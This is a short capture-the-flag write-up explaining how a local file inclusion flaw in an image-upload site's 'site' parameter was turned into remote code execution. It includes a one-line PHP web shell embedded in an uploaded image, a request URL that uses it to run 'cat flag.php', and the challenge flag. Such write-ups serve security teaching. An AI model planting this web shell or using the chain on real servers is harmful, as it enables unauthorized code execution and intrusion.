# Local Fun Inclusion

For this challenge we are provided with a URL `http://lfi.hax1.allesctf.net:8081/`. On this website we can upload image files, and view images we uploaded.

The URL of the page to view uploaded images looks interesting: `http://lfi.hax1.allesctf.net:8081/index.php?site=view.php&image=uploads/4a902b8e5615c86ac23c71f21f6612fe.jpg`. `uploads/4a902b8e5615c86ac23c71f21f6612fe.jpg` is probably the location of the uploaded image and `site=view.php` looks like it might be vulnerable to local file inclusion (who would have thought, given the challenge name). That's quickly verified by navigating to `http://lfi.hax1.allesctf.net:8081/index.php?site=uploads/4a902b8e5615c86ac23c71f21f6612fe.jpg`, which shows the raw image file embedded in the response.

Embedding PHP code, like `<?php system($_GET["c"]); ?>`, in the image file grants the ability to execute arbitrary code on the webserver. The flag can be obtained through the response to `http://lfi.hax1.allesctf.net:8081/index.php?site=uploads/4a902b8e5615c86ac23c71f21f6612fe.jpg&c=cat+flag.php`.

Flag: `CSCG{G3tting_RCE_0n_w3b_is_alw4ys_cool}`
